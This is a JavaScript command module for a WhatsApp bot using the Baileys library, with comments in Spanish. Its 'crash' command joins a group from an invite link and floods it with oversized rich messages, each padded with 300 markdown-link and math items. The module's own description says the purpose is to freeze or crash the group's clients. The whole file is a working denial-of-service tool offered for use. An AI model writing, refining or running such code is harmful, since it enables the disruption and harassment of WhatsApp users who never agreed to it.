import { AIRich } from "@whiskeysockets/baileys";

export default {
  name: ["crash"],
  description: "Traba un grupo por enlace",
  category: "owner",
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes("whatsapp.com")) {
      return reply({ text: `Pásame el enlace. Ej: .${cmdName} https://chat.whatsapp.com/XXXX 5` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: "Enlace inválido." });
    const code = match[1];

    const partes = text.split(/\s+/);
    const cant = parseInt(partes[1]) || 5;

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: "No pude leer el grupo." });
    }
    try { await sock.groupAcceptInvite(code); } catch {}
    await new Promise((r) => setTimeout(r, 2500));

    await reply({ text: `💥 Mandando ${cant} rich a ${groupId}...` });

    for (let b = 0; b < cant; b++) {
      const rich = new AIRich(sock);
      rich.setTitle(`💥 CRASH ${b + 1}/${cant}`);
      for (let i = 0; i < 300; i++) {
        rich.addText(`Item ${i} [x](https://x.com) [](https://y.com) $x^2$`);
      }
      rich.addSuggest(["a","b","c","d","e","f","g","h","i","j"]);
      rich.setFooter("boom 💀");

      try {
        await rich.send(groupId);
        await reply({ text: `✅ ${b + 1}/${cant} enviado` });
      } catch (e) {
        await reply({ text: `❌ ${b + 1} falló: ${e.message}` });
      }

      // espera entre mensajes para que el cliente procese
      await new Promise((r) => setTimeout(r, 1500));
    }

    return reply({ text: "✅ terminado." });
  },
};